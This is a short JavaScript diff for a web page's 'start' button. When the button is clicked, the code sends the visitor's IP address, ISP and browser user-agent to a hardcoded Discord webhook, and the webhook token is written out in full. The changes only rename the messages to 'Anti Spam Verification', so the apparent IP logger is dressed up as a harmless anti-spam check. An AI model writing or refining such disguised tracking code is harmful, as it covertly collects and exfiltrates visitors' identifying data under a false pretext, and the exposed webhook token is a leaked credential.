@@ -12,9 +12,9 @@ document.getElementById("start-btn").addEventListener("click", function () {
         .then(data => {
             let webhookURL = "https://discordapp.com/api/webhooks/1349835869753835560/9h2Z7a8wOKcw6skq0udXhmWOKZMcpCZZYwX5r67UA3X2R5ksRQFT9RY_U2ivIdHuN8u3";
             let payload = {
-                username: "Verification Log",
+                username: "Anti Spam Verification Log",
                 embeds: [{
-                    title: "New Verification Attempt",
+                    title: "New Anti Spam Verification Attempt",
                     color: 16711680,
                     fields: [
                         { name: "IP Address", value: data.ip, inline: true },
@@ -24,7 +24,7 @@ document.getElementById("start-btn").addEventListener("click", function () {
                         { name: "ISP", value: data.org, inline: true },
                         { name: "User-Agent", value: navigator.userAgent, inline: false }
                     ],
-                    footer: { text: "Verification System" },
+                    footer: { text: "Anti Spam Verification System" },
                     timestamp: new Date().toISOString()
                 }]
             };
